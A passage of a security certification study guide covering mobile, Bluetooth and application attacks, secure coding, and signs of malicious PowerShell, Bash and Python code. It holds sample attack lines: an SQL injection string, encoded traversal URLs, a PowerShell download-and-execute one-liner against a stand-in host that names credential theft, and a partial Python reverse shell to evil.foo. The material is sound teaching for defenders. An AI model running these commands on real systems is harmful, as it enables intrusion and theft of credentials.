- Jailbreaking—iOS is more restrictive than Android so the term "jailbreaking" became popular for exploits that enabled the user to obtain root privileges, sideload apps, change or add carriers, and customize the interface. iOS jailbreaking is accomplished by booting the device with a patched kernel. For most exploits, this can only be done when the device is attached to a computer when it boots (tethered jailbreak).
- Carrier unlocking—for either iOS or Android, this means removing the restrictions that lock a device to a single carrier.

Rooting or jailbreaking mobile devices involves subverting the security measures on the device to gain administrative access to it. This also has the side effect of leaving many security measures permanently disabled. If the user has root permissions, then essentially any management agent software running on the device is compromised. If the user has applied a custom firmware image, they could have removed the protections that enforce segmentation. The device can no longer be assumed to run a trusted OS.

EMM/UEM has routines to detect a rooted or jailbroken device or custom firmware with no valid developer code signature and prevent access to an enterprise app, network, or workspace. Containerization and enterprise workspaces can use cryptography to protect the workspace in a way that is much harder to compromise than a local agent, even from a rooted/jailbroken device. 

BLUETOOTH CONNECTION METHODS 

Bluetooth is one of the most popular technologies for implementing Personal Area Networks (PANs). While native Bluetooth has fairly low data rates, it can be used to pair with another device and then use a Wi-Fi link for data transfer. This sort of connectivity is implemented by iOS's AirDrop feature.

Bluetooth devices have a few known security issues:

- Device discovery—a device can be put into discoverable mode meaning that it will connect to any other Bluetooth devices nearby. Unfortunately, even a device in non-discoverable mode is quite easy to detect.
- Authentication and authorization—devices authenticate ("pair") using a simple passkey configured on both devices. This should always be changed to some secure phrase and never left as the default. Also, check the device's pairing list regularly to confirm that the devices listed are valid.
- Malware—there are proof-of-concept Bluetooth worms and application exploits, most notably the BlueBorne exploit ([armis.com/blueborne](https://www.armis.com/blueborne/)), which can compromise any active and unpatched system regardless of whether discovery is enabled and without requiring any user intervention. There are also vulnerabilities in the authentication schemes of many devices. Keep devices updated with the latest firmware.

Pairing a computer with a smartphone. (Screenshot used with permission from Microsoft.)

It is also the case that using a control center toggle may not actually turn off the Bluetooth radio on a mobile device. If there is any doubt about patch status or exposure to vulnerabilities, Bluetooth should be fully disabled through device settings.

Unless some sort of authentication is configured, a discoverable device is vulnerable to bluejacking, a sort of spam where someone sends you an unsolicited text (or picture/video) message or vCard (contact details). This can also be a vector for malware, as demonstrated by the Obad Android Trojan malware ([securelist.com/the-most-sophisticated-android-trojan/35929](https://securelist.com/the-most-sophisticated-android-trojan/35929/)).

Bluesnarfing refers to using an exploit in Bluetooth to steal information from someone else's phone. The exploit (now patched) allows attackers to circumvent the authentication mechanism. Even without an exploit, a short (4 digit) PIN code is vulnerable to brute force password guessing.

Other significant risks come from the device that is being connected. A peripheral device with malicious firmware can be used to launch highly effective attacks. This type of risk has a low likelihood, as the resources required to craft such malicious peripherals are demanding. 

SMS/MMS/RCS AND PUSH NOTIFICATIONS

The Short Message Service (SMS) and Multimedia Message Service (MMS) are operated by the cellular network providers. They allow transmission of text messages and binary files. Vulnerabilities in SMS and the SS7 signaling protocol that underpins it have cast doubt on the security of 2-step verification mechanisms ([kaspersky.com/blog/ss7-hacked/25529](https://www.kaspersky.com/blog/ss7-hacked/25529/)).

Rich Communication Services (RCS) is designed as a platform-independent advanced messaging app, with a similar feature set to proprietary apps like WhatsApp and iMessage. These features include support for video calling, larger binary attachments, group messaging/calling, and read receipts. RCS is supported by carriers via Universal Profile for Advanced Messaging ([gsma.com/futurenetworks/digest/universal-profile-version-2-0-advanced-rcs-messaging](https://www.gsma.com/futurenetworks/digest/universal-profile-version-2-0-advanced-rcs-messaging/)). The main drawbacks of RCS are that carrier support is patchy (messages fallback to SMS if RCS is not supported) and there is no end-to-end encryption, at the time of writing ([theverge.com/2020/5/27/21271186/google-rcs-t-mobile-encryption-ccmi-universal-profile](https://www.theverge.com/2020/5/27/21271186/google-rcs-t-mobile-encryption-ccmi-universal-profile)).

Vulnerabilities in processing attachments and rich formatting have resulted in DoS attacks against certain handsets in the past, so it is important to keep devices patched against known threats.

Push notifications are store services (such as Apple Push Notification Service and Google Cloud to Device Messaging) that an app or website can use to display an alert on a mobile device. Users can choose to disable notifications for an app, but otherwise the app developer can target notifications to some or all users with that app installed. Developers need to take care to properly secure the account and services used to send push notifications. There have been examples in the past of these accounts being hacked and used to send fake communications.

APPLICATION ATTACKS

﻿An application attack targets a vulnerability in OS or application software. An application vulnerability is a design flaw that can cause the application security system to be circumvented or that will cause the application to crash.

﻿Privilege Escalation

The purpose of most application attacks is to allow the threat actor to run his or her own code on the system. This is referred to as arbitrary code execution. Where the code is transmitted from one machine to another, it can be referred to as remote code execution. The code would typically be designed to install some sort of backdoor or to disable the system in some way (denial of service).

An application or process must have privileges to read and write data and execute functions. Depending on how the software is written, a process may run using a system account, the account of the logged-on user, or a nominated account. If a software exploit works, the attacker may be able to execute arbitrary code with the same privilege level as the exploited process. There are two main types of privilege escalation:

- Vertical privilege escalation (or elevation) is where a user or application can access functionality or data that should not be available to them. For instance, a process might run with local administrator privileges, but a vulnerability allows the arbitrary code to run with higher system privileges.
- Horizontal privilege escalation is where a user accesses functionality or data that is intended for another user. For instance, via a process running with local administrator privileges on a client workstation, the arbitrary code is able to execute as a domain account on an application server.

Without performing detailed analysis of code or process execution in real-time, it is privilege escalation that provides the simplest indicator of an application attack. If process logging has been configured ([varonis.com/blog/sysmon-threat-detection-guide](https://www.varonis.com/blog/sysmon-threat-detection-guide/)), the audit log can provide evidence of privilege escalation attempts. These attempts may also be detected by incident response and endpoint protection agents, which will display an alert.

﻿Error Handling

﻿An application attack may cause an error message. In Windows, this may be of the following types: "Instruction could not be read or written," "Undefined exception," or "Process has encountered a problem." One issue for error handling is that the application should not reveal configuration or platform details that could help an attacker. For example, an unhandled exception on a web application might show an error page that reveals the type and configuration of a database server.

﻿Improper Input Handling 

﻿Most software accepts user input of some kind, whether the input is typed manually or passed to the program by another program, such as a browser passing a URL to a web server or a Windows process using another process via its application programming interface. Good programming practice dictates that input should be tested to ensure that it is valid; that is, the sort of data expected by the receiving process. Most application attacks work by passing invalid or maliciously constructed data to the vulnerable process. There are many ways of exploiting improper input handling, but many attacks can be described as either overflow-type attacks or injection-type attacks.

OVERFLOW VULNERABILITIES

In an overflow attack, the threat actor submits input that is too large to be stored in a variable assigned by the application. Some of the general overflow vulnerabilities are discussed here. To keep up to date with specific attack methods and new types of attack, monitor a site such as OWASP ([owasp.org/www-community/attacks](http://www.owasp.org/www-community/attacks)). Ideally, the code used to attempt these attacks will be identified by network IDS or by an endpoint protection agent. Unsuccessful attempts may be revealed through unexplained crashes or error messages following a file download, execution of a new app or a script, or connection of new hardware. 
### Buffer Overflow 
A buffer is an area of memory that the application reserves to store expected data. To exploit a buffer overflow vulnerability, the attacker passes data that deliberately overfills the buffer. One of the most common vulnerabilities is a stack overflow. The stack is an area of memory used by a program subroutine. It includes a return address, which is the location of the program that called the subroutine. An attacker could use a buffer overflow to change the return address, allowing the attacker to run arbitrary code on the system. 

When executed normally, a function will return control to the calling function. If the code is vulnerable, an attacker can pass malicious data to the function, overflow the stack, and run arbitrary code to gain a shell on the target system.
### Integer Overflow
An integer is a positive or negative number with no fractional component (a whole number). Integers are widely used as a data type, where they are commonly defined with fixed lower and upper bounds. An integer overflow attack causes the target software to calculate a value that exceeds these bounds. This may cause a positive number to become negative (changing a bank debit to a credit, for instance). It could also be used where the software is calculating a buffer size; if the attacker is able to make the buffer smaller than it should be, he or she may then be able to launch a buffer overflow attack.

NULL POINTER DEREFERENCING AND RACE CONDITIONS 

In C/C++ programming, a pointer is a variable that stores a memory location, rather than a value. Attempting to read or write that memory address via the pointer is called dereferencing. If the memory location is invalid or null (perhaps by some malicious process altering the execution environment), this creates a null pointer dereference type of exception, and the process will crash, probably. In some circumstances, this might also allow a threat actor to run arbitrary code. Programmers can use logic statements to test that a pointer is not null before trying to use it.

A race condition is one means of engineering a null pointer dereference exception. Race conditions occur when the outcome from an execution process is directly dependent on the order and timing of certain events, and those events fail to execute in the order and timing intended by the developer. In 2016, the Linux kernel was discovered to have an exploitable race condition vulnerability, known as Dirty COW ([theregister.com/2016/10/21/linux_privilege_escalation_hole](https://www.theregister.com/2016/10/21/linux_privilege_escalation_hole)).

Race condition attacks can also be directed at databases and file systems. A time of check to time of use (TOCTTOU) race condition occurs when there is a change between when an app checked a resource and when the app used the resource. This change invalidates the check. An attacker that can identify a TOCTTOU vulnerability will attempt to manipulate data after it has been checked but before the application can use this data to perform some operation. For example, if an application creates a temporary file to store a value for later use, and an attacker can replace or delete this file between the time it is created and the time it is used, then the attacker is exploiting a TOCTTOU vulnerability.

DLL INJECTION AND DRIVER MANIPULATION

A dynamic link library (DLL) is a binary package that implements some sort of standard functionality, such as establishing a network connection or performing cryptography. The main process of a software application is likely to load several DLLs during the normal course of operations.

DLL injection is a vulnerability in the way the operating system allows one process to attach to another. This functionality can be abused by malware to force a legitimate process to load a malicious link library. The link library will contain whatever functions the malware author wants to be able to run. Malware uses this technique to move from one host process to another to avoid detection. A process that has been compromised by DLL injection might open unexpected network connections, or interact with files and the registry suspiciously.

To perform DLL injection the malware must already be operating with sufficient privileges, typically local administrator or system privileges. It must also evade detection by anti-virus software. One means of doing this is code refactoring. Refactoring means that the code performs the same function by using different methods (control blocks, variable types, and so on). Refactoring means that the A-V software may no longer identify the malware by its signature.

OS function calls to allow DLL injection are legitimately used for operations such as debugging and monitoring. Another opportunity for malware authors to exploit these calls is the Windows Application Compatibility framework. This allows legacy applications written for an OS, such as Windows XP, to run on later versions. The code library that intercepts and redirects calls to enable legacy mode functionality is called a shim. The shim must be added to the registry and its files (packed in a shim database/.SDB file) added to the system folder. The shim database represents a way that malware with local administrator privileges can run on reboot (persistence).

UNIFORM RESOURCE LOCATOR ANALYSIS

As well as pointing to the host or service location on the Internet (by domain name or IP address), a uniform resource locator (URL) can encode some action or data to submit to the server host. This is a common vector for malicious activity. 

Uniform resource locator (URL) analysis.
### HTTP Methods
As part of URL analysis, it is important to understand how HTTP operates. An HTTP session starts with a client (a user-agent, such as a web browser) making a request to an HTTP server. The connection establishes a TCP connection. This TCP connection can be used for multiple requests, or a client can start new TCP connections for different requests. A request typically comprises a method, a resource (such as a URL path), version number, headers, and body. The principal method is GET, used to retrieve a resource. Other methods include:

- POST—send data to the server for processing by the requested resource.
- PUT—create or replace the resource.
- DELETE—can be used to remove the resource.
- HEAD—retrieve the headers for a resource only (not the body).

Data can be submitted to a server either by using a POST or PUT method and the HTTP headers and body, or by encoding the data within the URL used to access the resource. Data submitted via a URL is delimited by the ? character, which follows the resource path. Query parameters are usually formatted as one or more name=value pairs, with ampersands delimiting each pair. A URL can also include a fragment or anchor ID, delimited by #. The fragment is not processed by the web server. An anchor ID is intended to refer to a section of a page but can be misused to inject JavaScript.

The server response comprises the version number and a status code and message, plus optional headers, and message body. An HTTP response code is the header value returned by a server when a client requests a URL, such as 200 for "OK" or 404 for "Not Found."
### Percent Encoding
A URL can contain only unreserved and reserved characters from the ASCII set. Reserved ASCII characters are used as delimiters within the URL syntax and should only be used unencoded for those purposes. The reserved characters are:

: / ? # [ ] @ ! $ & ' ( ) \* + , ; =

There are also unsafe characters, which cannot be used in a URL. Control characters, such as null string termination, carriage return, line feed, end of file, and tab, are unsafe. Percent encoding allows a user-agent to submit any safe or unsafe character (or binary data) to the server within the URL. Its legitimate uses are to encode reserved characters within the URL when they are not part of the URL syntax and to submit Unicode characters. Percent encoding can be misused to obfuscate the nature of a URL (encoding unreserved characters) and submit malicious input. Percent encoding can exploit weaknesses in the way the server application performs decoding. Consequently, URLs that make unexpected or extensive use of percent encoding should be treated carefully. You can use a resource such as W3 Schools ([w3schools.com/tags/ref_urlencode.asp](https://www.w3schools.com/tags/ref_urlencode.asp)) for a complete list of character codes, but it is helpful to know some of the characters most widely used in exploits.

|Character|Percent Encoding|
| :- | :- |
|null|%00|
|space|%20|
|CR (Carriage Return)|%0D|
|LF (Line Feed)|%0A|
|+|%2B|
|%|%25|
|/|%2F|
|\|%5C|
|.|%2E|
|?|%3F|
|"|%22|
|'|%27|
|<|%3C|
|>|%3E|
|&|%26|
|||%7C|


STRUCTURED QUERY LANGUAGE INJECTION ATTACKS

Attacks such as session replay, CSRF, and DOM-based XSS are client-side attacks. This means that they execute arbitrary code on the browser. A server-side attack causes the server to do some processing or run a script or query in a way that is not authorized by the application design. Most server-side attacks depend on some kind of injection attack.

Where an overflow attack works against the way a process performs memory management, an injection attack exploits some unsecure way in which the application processes requests and queries. For example, an application might allow a user to view his or her profile with a database query that should return the single record for that one user's profile. An application vulnerable to an injection attack might allow a threat actor to return the records for all users, or to change fields in the record when they are only supposed to be able to read them.

A web application is likely to use Structured Query Language (SQL) to read and write information from a database. The main database operations are performed by SQL statements for selecting data (SELECT), inserting data (INSERT), deleting data (DELETE), and updating data (UPDATE). In a SQL injection attack, the threat actor modifies one or more of these four basic functions by adding code to some input accepted by the app, causing it to execute the attacker's own set of SQL queries or parameters. If successful, this could allow the attacker to extract or insert information into the database or execute arbitrary code on the remote system using the same privileges as the database application ([owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)).

For example, consider a web form that is supposed to take a name as input. If the user enters "Bob", the application runs the following query:

SELECT \* FROM tbl\_user WHERE username = 'Bob'

If a threat actor enters the string ' or 1=1-- and this input is not sanitized, the following malicious query will be executed:

SELECT \* FROM tbl\_user WHERE username = '' or 1=1--'

The logical statement 1=1 is always true, and the -- string turns the rest of the statement into a comment, making it more likely that the web application will parse this modified version and dump a list of all users.

DIRECTORY TRAVERSAL AND COMMAND INJECTION ATTACKS 

Directory traversal is another type of injection attack performed against a web server. The threat actor submits a request for a file outside the web server's root directory by submitting a path to navigate to the parent directory (../). This attack can succeed if the input is not filtered properly and access permissions on the file are the same as those on the web server directory.

The threat actor might use a canonicalization attack to disguise the nature of the malicious input. Canonicalization refers to the way the server converts between the different methods by which a resource (such as a file path or URL) may be represented and submitted to the simplest (or canonical) method used by the server to process the input. Examples of encoding schemes include HTML entities and character set percent encoding (ASCII and Unicode). An attacker might be able to exploit vulnerabilities in the canonicalization process to perform code injection or facilitate directory traversal. For example, to perform a directory traversal attack, the attacker might submit a URL such as:

http://victim.foo/?show=../../../../etc/config

A limited input validation routine would prevent the use of the string ../ and refuse the request. If the attacker submitted the URL using the encoded version of the characters, he or she might be able to circumvent the validation routine:

http://victim.foo/?show=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/config

A command injection attack attempts to cause the server to run OS shell commands and return the output to the browser. As with directory traversal, the web server should normally be able to prevent commands from operating outside of the server's directory root and to prevent commands from running with any other privilege level than the web "guest" user (who is normally granted only very restricted privileges). A successful command injection attack would find some way of circumventing this security (or find a web server that is not properly configured). 

SERVER-SIDE REQUEST FORGERY

A server-side request forgery (SSRF) causes the server application to process an arbitrary request that targets another service, either on the same host or a different one ([owasp.org/www-community/attacks/Server_Side_Request_Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)). SSRF exploits both the lack of authentication between the internal servers and services (implicit trust) and weak input validation, allowing the attacker to submit unsanitized requests or API parameters.

A web application takes API input via a URL or as data encoded in HTTP response headers. The web application is likely to use a standard library to read (parse) the URL or response headers. Many SSRF attacks depend on exploits against specific parsing mechanisms in standard libraries for web servers, such as Apache or IIS, and web application programming languages and tools, such as the curl library, Java, and PHP. SSRF can also use XML injection to exploit weaknesses in XML document parsing.

One type of SSRF uses HTTP request splitting or CRLF injection. The attacker crafts a malicious URL or request header targeting the server's API. The request contains extra line feeds, which may be coded in some non-obvious way. Unless the web server strips these out when processing the URL, it will be tricked into performing a second HTTP request.

SSRF attacks are often targeted against cloud infrastructure where the web server is only the public-facing component of a deeper processing chain. A typical web application comprises multiple layers of servers, with a client interface, middleware logic layers, and a database layer. Requests initiated from the client interface (a web form) are likely to require multiple requests and responses between the middleware and back-end servers. These will be implemented as HTTP header requests and responses between each server's API. SSRF is a means of accessing these internal servers by causing the public server to execute requests on them. While with CSRF an exploit only has the privileges of the client, with SSRF the manipulated request is made with the server's privilege level.

Server-side request forgery example. (Images © 123RF.com.)

SSRF encompasses a very wide range of potential exploits and targets, some of which include:

- Reconnaissance—a response may contain metadata describing the type and configuration of internal servers. SSRF can also be used to port scan within the internal network.
- Credential stealing—a response may contain an API key that the internal servers use between themselves.
- Unauthorized requests—the server-initiated request might change data or access a service in an unauthorized way.
- Protocol smuggling—despite initially being carried over HTTP, the SSRF might target an internal SMTP or FTP server. That server may be configured in a "best effort" way, strip the HTTP header, and do its best to return the response to the SMTP or FTP request.

SECURE CODE USAGE

Developing code to perform some function is hard work, so developers will often look to see if someone else has done that work already. A program may make use of existing code in the following ways:

- Code reuse—using a block of code from elsewhere in the same application or from another application to perform a different function (or perform the same function in a different context). The risk here is that the copy and paste approach causes the developer to overlook potential vulnerabilities (perhaps the function's input parameters are no longer validated in the new context).
- Third-party library—using a binary package (such as a dynamic link library) that implements some sort of standard functionality, such as establishing a network connection or performing cryptography. Each library must be monitored for vulnerabilities and patched promptly.
- Software development kit (SDK)—using sample code or libraries of pre-built functions from the programming environment used to create the software or interact with a third party API. As with other third party libraries or code, it is imperative to monitor for vulnerabilities.
- Stored procedures—using a pre-built function to perform a database query. A stored procedure is a part of a database that executes a custom query. The procedure is supplied an input by the calling program and returns a predefined output for matched records. This can provide a more secure means of querying the database. Any stored procedures that are part of the database but not required by the application should be disabled.

OTHER SECURE CODING PRACTICES

Input and error handling plus secure reuse of existing code cover some of the main security-related development practices that you should be aware of. There are a few other issues that can arise during the development and deployment of application code.
### Unreachable Code and Dead Code
Unreachable code is a part of application source code that can never be executed. For example, there may be a routine within a logic statement (If ... Then) that can never be called because the conditions that would call it can never be met. Dead code is executed but has no effect on the program flow. For example, there may be code to perform a calculation, but the result is never stored as a variable or used to evaluate a condition.

This type of code may be introduced through carelessly reused code, or when a block of code is rewritten or changed. Unreachable and dead code should be removed from the application to forestall the possibility that it could be misused in some way. The presence of unreachable/dead code can indicate that the application is not being well maintained.
### Obfuscation/Camouflage 
It is important that code be well-documented, to assist the efforts of multiple programmers working on the same project. Well-documented code is also easier to analyze, however, which may assist the development of attacks. Code can be made difficult to analyze by using an obfuscator, which is software that randomizes the names of variables, constants, functions, and procedures, removes comments and white space, and performs other operations to make the compiled code physically and mentally difficult to read and follow. This sort of technique might be used to make reverse engineering an application more difficult and as a way of disguising malware code.

STATIC CODE ANALYSIS 

Development is only one stage in the software life cycle. A new release of an application or automation script should be audited to ensure that it meets the goals of confidentiality, integrity, and availability critical to any secure computer system.

Static code analysis (or source code analysis) is performed against the application code before it is packaged as an executable process. The analysis software must support the programming language used by the source code. The software will scan the source code for signatures of known issues, such as OWASP Top 10 Most Critical Web Application Security Risks or injection vulnerabilities generally. NIST maintains a list of source code analyzers and their key features ([samate.nist.gov/index.php/Source_Code_Security_Analyzers.html](https://samate.nist.gov/index.php/Source_Code_Security_Analyzers.html)).

Human analysis of software source code is described as a manual code review. It is important that the code be reviewed by developers (peers) other than the original coders to try to identify oversights, mistaken assumptions, or a lack of knowledge or experience. It is important to establish a collaborative environment in which reviews can take place effectively.

DYNAMIC CODE ANALYSIS

Static code review techniques will not reveal vulnerabilities that might exist in the runtime environment, such as exposure to race conditions or unexpected user input. Dynamic analysis means that the application is tested under "real world" conditions using a staging environment.

Fuzzing is a means of testing that an application's input validation routines work well. Fuzzing means that the test or vulnerability scanner generates large amounts of deliberately invalid and/or random input and records the responses made by the application. This is a form of "stress testing" that can reveal how robust the application is. There are generally three types of fuzzers, representing different ways of injecting manipulated input into the application:

- Application UI—identify input streams accepted by the application, such as input boxes, command line switches, or import/export functions.
- Protocol—transmit manipulated packets to the application, perhaps using unexpected values in the headers or payload.
- File format—attempt to open files whose format has been manipulated, perhaps manipulating specific features of the file.

Fuzzers are also distinguished by the way in which they craft each input (or test case). The fuzzer may use semi-random input (dumb fuzzer) or might craft specific input based around known exploit vectors, such as escaped command sequences or character literals, or by mutating intercepted inputs.

Associated with fuzzing is the concept of stress testing an application to see how an application performs under extreme performance or usage scenarios.

Finally, the fuzzer needs some means of detecting an application crash and recording which input sequence generated the crash. 

Loading a list of strings for the payload of a fuzzing test in Burp Suite. (Screenshot Burp Suite [portswigger.net/burp](https://portswigger.net/burp).)

SCRIPTING

Automation using scripting means that each configuration or build task is performed by a block of code. The script will take standard arguments as data, so there is less scope for uncertainty over configuration choices leading to errors. A script will use the following elements:

- Parameters that the script takes as input data (passed to the script as arguments).
- Branching and looping statements that can alter the flow of execution based on logic conditions.
- Validation and error handlers to check inputs and ensure robust execution.
- Unit tests to ensure that the script returns the expected outputs, given the expected inputs.

Popular scripting languages for automation include PowerShell ([docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7)), Python ([python.org](https://www.python.org/)), JavaScript ([w3schools.com/js](https://www.w3schools.com/js/)), Ruby ([ruby-lang.org/en](https://www.ruby-lang.org/en/)), and Go ([golang.org](https://golang.org/)). Scripting will also make use of domain-specific languages, such as SQL, XML parsing, regex, and orchestration tools.

A scripting language like Python is a general purpose or procedural language. It can be adapted to perform many tasks. A domain-specific language (DSL) performs a particular task, such as regex string parsing. Orchestration manages multiple automation scripts and configuration data to provision a service.

All coding languages have a specific syntax that constrains the way sections of code are laid out in blocks and the standard statements that are available, such as branching and looping constructions.

POWERSHELL SCRIPT ENVIRONMENT

PowerShell is the preferred method of performing Windows administration tasks ([docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7)). It has also become the Windows hacker's go-to toolkit. PowerShell statements can be executed at a PowerShell prompt, or run as a script (.ps1) on any PowerShell-enabled host.

The Get-Help cmdlet shows help on different elements of the PowerShell environment. PowerShell is case-insensitive.
### Cmdlets and Functions
Most PowerShell usage is founded on cmdlets. A cmdlet is a compiled library that exposes some configuration or administrative task, such as starting a VM in Hyper-V. Cmdlets use a Verb-Noun naming convention. Cmdlets always return an object. Typically, the return from a cmdlet will be piped to some other cmdlet or function. For example:

Get-Process | Where { $\_.name -eq 'nmap' } | Format-List

You can also define simple functions for use within your scripts. Custom functions are declared within curly brackets:

function Cat-Name {

`  `param ($name,$surname)

`  `return $name + ' ' + $surname

}

#This ends the function declaration; the next statement calls it

$greeting = 'Hello ' + $(Cat-Name('World',''))

Write-Host $greeting

Note that a variable is declared by prefixing a label with $. 
### Logic and Looping Statements
PowerShell supports a wider range of branching and looping structures than Python, including the switch and do statements. Curly brackets are used to structure the statements. PowerShell uses textual operators (-eq, -ne, -lt, -gt, -le, and -ge).
### Modules
PowerShell can also be used with a large number of modules, which are added to a script using the Import-Module cmdlet.

EXECUTION CONTROL

Execution control is the process of determining what additional software or scripts may be installed or run on a host beyond its baseline.
### Allow and Block Lists
Execution control can be implemented as either an allow list or a block list.

- Allow list is a highly restrictive policy that means only running authorized processes and scripts. Allowing only specific applications that have been added to a list will inevitably hamper users at some point and increase support time and costs. For example, a user might need to install a conferencing application at short notice.
- Block list is a permissive policy that only prevents execution of listed processes and scripts. It is vulnerable to software that has not previously been identified as malicious (or capable of or vulnerable to malicious use).

These concepts can also be referred to as whitelists and blacklists, but most sources now deprecate this terminology.
### Code Signing
Code signing is the principal means of proving the authenticity and integrity of code (an executable or a script). The developer creates a cryptographic hash of the file then signs the hash using his or her private key. The program is shipped with a copy of the developer's code signing certificate, which contains a public key that the destination computer uses to read and verify the signature. The OS then prompts the user to choose whether to accept the signature and run the program.
### OS-Based Execution Control
Execution control is often enforced using a third-party security product, but there are some built-in Windows features that can perform the task:

- Software Restriction Policies (SRP)—available for most versions and editions of Windows, SRP can be configured as group policy objects (GPOs) to passlist file system locations from which executables and scripts can launch. Rules can also be configured by publisher signature or by file hash. There is also support for creating blocklist-based rules.
- AppLocker—improves configuration options and default usage of SRP. Notably AppLocker policies can be applied to user and group accounts rather than just computer accounts. However, AppLocker GPOs can only be configured for Enterprise and Ultimate editions of Windows 7 and later.
- Windows Defender Application Control (WDAC)—formerly Device Guard, this can be used to create Code Integrity (CI) policies, which can be used on their own or in conjunction with AppLocker. CI policies apply to the computer and affect all users. CI policies can be based on version-aware and publisher digital signatures, as well as image hashes and/or file paths. WDAC is a useful option for preventing administrator accounts from disabling execution control options ([docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)). WDAC is principally configured using XML policy statements and PowerShell.

In Windows, execution of PowerShell scripts can be inhibited by the execution policy. Note that the execution policy is not an access control mechanism. It can be bypassed in any number of different ways. WDAC is a robust mechanism for restricting use of potentially dangerous code, such as malicious PowerShell.

In Linux, execution control is normally enforced by using a mandatory access control (MAC) kernel module or Linux Security Module (LSM). The two main LSMs are SELinux ([access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux)) and AppArmor ([wiki.ubuntu.com/AppArmor](https://wiki.ubuntu.com/AppArmor)).

MALICIOUS CODE INDICATORS

As with buffer overflow, indicators of malicious code execution are either caught by endpoint protection software or discovered after the fact in logs of how the malware interacted with the network, file system, and registry. If you are performing threat hunting or observing malware in a sandbox, it is helpful to consider the main types of malicious activity:

- Shellcode—this is a minimal program designed to exploit a buffer overflow or similar vulnerability to gain privileges, or to drop a backdoor on the host if run as a Trojan ([attack.mitre.org/tactics/TA0002](https://attack.mitre.org/tactics/TA0002/)). Having gained a foothold, this type of attack will be followed by some type of network connection to download additional tools.
- Credential dumping—the malware might try to access the credentials file (SAM on a local Windows workstation) or sniff credentials held in memory by the lsass.exe system process ([attack.mitre.org/tactics/TA0006](https://attack.mitre.org/tactics/TA0006/)).
- Lateral movement/insider attack—the general procedure is to use the foothold to execute a process remotely, using a tool such as psexec ([docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)) or PowerShell ([attack.mitre.org/tactics/TA0008](https://attack.mitre.org/tactics/TA0008/)). The attacker might be seeking data assets or may try to widen access by changing the system security configuration, such as opening a firewall port or creating an account. If the attacker has compromised an account, these commands can blend in with ordinary network operations, though they could be anomalous behavior for that account.
- Persistence—this is a mechanism that allows the threat actor's backdoor to restart if the host reboots or the user logs off ([attack.mitre.org/tactics/TA0003](https://attack.mitre.org/tactics/TA0003/)). Typical methods are to use AutoRun keys in the registry, adding a scheduled task, or using Windows Management Instrumentation (WMI) event subscriptions.

POWERSHELL MALICIOUS INDICATORS

There are numerous exploit frameworks to leverage PowerShell functionality, such as PowerShell Empire, PowerSploit, Metasploit, and Mimikatz. Some suspicious indicators for PowerShell execution include the following:

- Cmdlets such as Invoke-Expression, Invoke-Command, Invoke-WMIMethod, New-Service, Create-Thread, Start-Process, and New-Object can indicate an attempt to run some type of binary shellcode. This is particularly suspicious if combined with a DownloadString or DownloadFile argument. One complication is that cmdlets can be shortened, assisting obfuscation. For example, Invoke-Expression can be run using IEX.

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://badsite.foo/DoEvil.ps1'); Do-Evil -StealCreds"

- Bypassing execution policy can also act as an indicator. The PowerShell code may be called as a Base64 encoded string (-enc argument) or may use the -noprofile or -ExecutionPolicy Bypass arguments.
- Using system calls to the Windows API might indicate an attempt to inject a DLL or perform process hollowing, where the malicious code takes over a legitimate process:

[Kernel32]::LoadLibrary("C:\Users\Foo\AppData\Local\Temp\doevil.dll")

- Using another type of script to execute the PowerShell is also suspicious. For example, the attacker might use JavaScript code embedded in a PDF to launch PowerShell via a vulnerable reader app.

The big problem with PowerShell indicators is distinguishing them from legitimate behavior. The following techniques can be used to assist with this:

- Use group policy to restrict execution of PowerShell to trusted accounts and hosts.
- Use group policy execution control to run scripts only from trusted locations.
- Consider use of Constrained Language Mode ([devblogs.microsoft.com/powershell/powershell-constrained-language-mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)) and signed scripts to limit the ability of exploit code to run on high-value target systems.
- Use PowerShell logging ([docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7)) and the Antimalware Scan Interface ([docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps](https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)) to detect and prevent obfuscated and suspicious code.
- Prevent the use of old PowerShell versions to mitigate the use of a downgrade attack to bypass access controls.

Symantec's white paper contains a useful introduction to PowerShell exploits ([docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)).

BASH AND PYTHON MALICIOUS INDICATORS

Most of the web runs on Linux, and Linux has proven remarkably resilient to attacks (meaning that it is able to withstand or recover quickly from difficult situations), given the high-value of the assets that depend on it. Most exploits of Linux systems depend on weak configuration, and/or vulnerabilities in web applications. In Linux, the command line is usually Bourne Again Shell (Bash). Many Linux systems have Python enabled as well. Python scripts or batch files of bash commands can be used for automation tasks, such as backup, or for malicious purposes.

A malicious script running on a Linux host might attempt the following:

1. Use commands such as whoami and ifconfig/ip/route to establish the local context.
1. Download tools, possibly using wget or curl.
1. Add crontab entries to enable persistence.
1. Add a user to sudo and enable remote access via SSH.
1. Change firewall rules using iptables.
1. Use tools such as Nmap to scan for other hosts.

A very common vector for attacking Linux hosts is to use an exploit to install a web shell as a backdoor ([acunetix.com/blog/articles/introduction-web-shells-part-1](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)). Typical code to implement a reverse shell (connecting out to the machine at evil.foo on port 4444) is as follows:

s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)

s.connect(("evil.foo",4444))

os.dup2(s.fileno(),0)

